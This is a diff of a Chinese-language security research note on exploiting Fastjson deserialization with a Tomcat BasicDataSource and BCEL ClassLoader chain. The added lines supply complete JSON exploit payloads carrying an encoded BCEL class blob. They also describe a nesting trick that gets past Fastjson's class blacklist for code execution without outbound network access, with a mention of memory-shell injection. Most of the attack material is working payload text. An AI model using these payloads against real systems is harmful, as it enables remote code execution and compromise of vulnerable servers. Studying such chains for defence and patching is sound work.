@@ -322,7 +322,7 @@ public class BCEL_getConnect {
 }
 ```
 
-能打目标不出网，直接执行字节码，搭配Servlet进行回显，或者写ssh？
+能打目标不出网，直接执行字节码，搭配内存马进行回显，或者写ssh？
 
 但是需要目标有Tomcat依赖
 
@@ -454,35 +454,25 @@ public class JdbcRowSetImpl_1_2_41 {
 
 
 
-同理，改造的BCEL能用吗：
+同理，如下改造的BCEL能用吗：
 
-```java
-public class BCEL_parse_1_2_47 {
-    public static void main(String[] args) throws Exception
+```json
+{
+    {"@type":"java.lang.Class","val":"org.apache.tomcat.dbcp.dbcp.BasicDataSource"},
+	{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},
     {
-        byte[] code = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\Runtime_static.class"));
-        String bcel = "\""+"$$BCEL$$"+ Utility.encode(code,true)+"\"";
-        String payload = "{{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"}," +
-                "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}," +
-                "{\n" +
-                "    {\n" +
-                "        \"aaa\": {\n" +
-                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
-                "                \"driverClassLoader\": {\n" +
-                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
-                "                },\n" +
-                "                \"driverClassName\": "+ bcel+ "\n" +
-                "        }\n" +
-                "    }: \"bbb\"\n" +
-                "}}";
-        JSON.parse(payload);
-    }
+        {
+            "aaa": {
+                    "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+                    "driverClassLoader": {
+                        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                    },
+                    "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$c9N$c30$Q$7dn$d3$s$84$94$$P$f6$7d$z$i$e8$85$h$88$L$82$La$R$ad$e0$88$5cc$V$976$a9R$X$f1G$9c$b9$A$e2$c0$H$f0Q$88$89$vP$E$91$e2$c9$bcy$f3$e6M$fc$f6$fe$f2$K$60$L$ab$$$i$8c$b9$Y$c7$84$83$c98N$d9$98v$91$c2$8c$8dY$hs$M$e9$j$V$u$bd$cb$90$y$ad$9f3X$7b$e1$95d$c8$fa$w$90$c7$ddVMFU$5ek$SR$f0C$c1$9b$e7$3cRq$de$D$z$7d$ad$3a$M9$ff$ac$hh$d5$92$97$j$cd$b5$S$db$M$ce$8eh$f6$84$Z$R$8b$7e$83$df$f2r$93$H$f5$f2$fe$9d$90m$ad$c2$80h$99$8a$e6$e2$e6$88$b7$8d$mycp$xa7$S$f2$40$c5$D$86$7f$Lo$c6$w$k$G$e0$da$98$f7$b0$80E$f2$40$b6$84$87$r$y$T$fd$9f$v$kV$e02$M$fdV$o$d3$3f$dc$93ZC$K$cd$90$ff$81zl$b2S$97$fa$3b$v$96$d6$fd$3f$iZ$c3$92w$92$q$d7J$7d$d5$8a$8eTP$df$eeo8$8dB$n$3b$jj$c8$b6$a9$a8$cd$f2$d5$88$LI$ab$d8tU$f1$93$A$8b$X$a4s$90$b22EF1$b5$f1$E$f6$60$ca$k$9di$D$d2$ff$a3$d3$fb$q$60$IY$8a$Or$df$cd$dc$88$B$85g$q$K$c9GX$X$f7p$O7$k$91$7e0$f8$A$f5$a6$904$8a$a3$f4$FX$84$d9$G$cd$d0$8c$3c$a9$7dM$c8P$z$8f$Ce$c3$f4$daH$f86F$y$w$U$8d$a9$d1$Pg4$40Dt$C$A$A"
+            }
+    	}: "bbb"
+	}
 }
 ```
-
-
-
-这个版本不出网用不了BCEL，因为BasicDataSource嵌套了ClassLoader利用，而且不能传两个java.lang.Class，分析如下：
 
 快进到看mappings，可以看到两个都put进Mappings了
 
@@ -496,13 +486,47 @@ public class BCEL_parse_1_2_47 {
 
 ![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008194203623.png)
 
+为什么ClassLoader会在黑名单
 
+实际上fastjson解析，json的嵌套处理可以视为一个栈，栈底层的map缓存了BasicDataSource和ClassLoader，对于栈的倒数第二层并没有什么用（这里很容易理解是个栈吧）
 
-1.2.24能打JNDI和不出网BCEL，1.2.25-1.2.47只能打出网的JNDI
+同一层的BasicDataSource和ClassLoader不能绕过，那套娃呢？先入栈BassicDataSource，再入栈ClassLoader，在取出的时候先初始化最里面的ClassLoader，退栈ClassLoader，再初始化BasicDataSource
+
+如下，能够进行利用：
+
+```json
+{
+    "name":
+    {
+        "@type" : "java.lang.Class",
+        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
+    },
+    "x" : {
+        "name": {
+            "@type" : "java.lang.Class",
+            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
+        },
+        "y": {
+            "@type":"com.alibaba.fastjson.JSONObject",
+            "c": {
+                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+                "driverClassLoader": {
+                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                },
+                "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$c9N$c30$Q$7dn$d3$s$84$94$$P$f6$7d$z$i$e8$85$h$88$L$82$La$R$ad$e0$88$5cc$V$976$a9R$X$f1G$9c$b9$A$e2$c0$H$f0Q$88$89$vP$E$91$e2$c9$bcy$f3$e6M$fc$f6$fe$f2$K$60$L$ab$$$i$8c$b9$Y$c7$84$83$c98N$d9$98v$91$c2$8c$8dY$hs$M$e9$j$V$u$bd$cb$90$y$ad$9f3X$7b$e1$95d$c8$fa$w$90$c7$ddVMFU$5ek$SR$f0C$c1$9b$e7$3cRq$de$D$z$7d$ad$3a$M9$ff$ac$hh$d5$92$97$j$cd$b5$S$db$M$ce$8eh$f6$84$Z$R$8b$7e$83$df$f2r$93$H$f5$f2$fe$9d$90m$ad$c2$80h$99$8a$e6$e2$e6$88$b7$8d$mycp$xa7$S$f2$40$c5$D$86$7f$Lo$c6$w$k$G$e0$da$98$f7$b0$80E$f2$40$b6$84$87$r$y$T$fd$9f$v$kV$e02$M$fdV$o$d3$3f$dc$93ZC$K$cd$90$ff$81zl$b2S$97$fa$3b$v$96$d6$fd$3f$iZ$c3$92w$92$q$d7J$7d$d5$8a$8eTP$df$eeo8$8dB$n$3b$jj$c8$b6$a9$a8$cd$f2$d5$88$LI$ab$d8tU$f1$93$A$8b$X$a4s$90$b22EF1$b5$f1$E$f6$60$ca$k$9di$D$d2$ff$a3$d3$fb$q$60$IY$8a$Or$df$cd$dc$88$B$85g$q$K$c9GX$X$f7p$O7$k$91$7e0$f8$A$f5$a6$904$8a$a3$f4$FX$84$d9$G$cd$d0$8c$3c$a9$7dM$c8P$z$8f$Ce$c3$f4$daH$f86F$y$w$U$8d$a9$d1$Pg4$40Dt$C$A$A",
+
+                     "$ref": "$.x.y.c.connection"
+            }
+        }
+    }
+}
+```
+
+只可惜BCEL这么好的东西，在8u251之后被移除
+
+https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html
 
 BCEL打内存马=修改本地组件功能，通过达到不出网利用且回显的手法
-
-网上流传的1.2.25+版本打BCEL都是骗子，我鉴定过了，一个腾讯云的一个freebuf的，自己都跑不通还来骗
 
 高版本利用：https://www.freebuf.com/vuls/361576.html
 
